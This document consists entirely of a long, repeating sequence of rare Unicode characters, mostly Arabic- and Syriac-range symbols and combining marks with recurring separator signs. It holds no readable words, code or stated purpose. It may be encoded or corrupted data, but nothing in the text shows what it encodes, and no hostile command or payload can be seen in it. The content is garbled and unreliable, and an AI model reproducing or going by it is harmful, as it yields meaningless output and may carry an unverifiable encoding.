࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛𞋬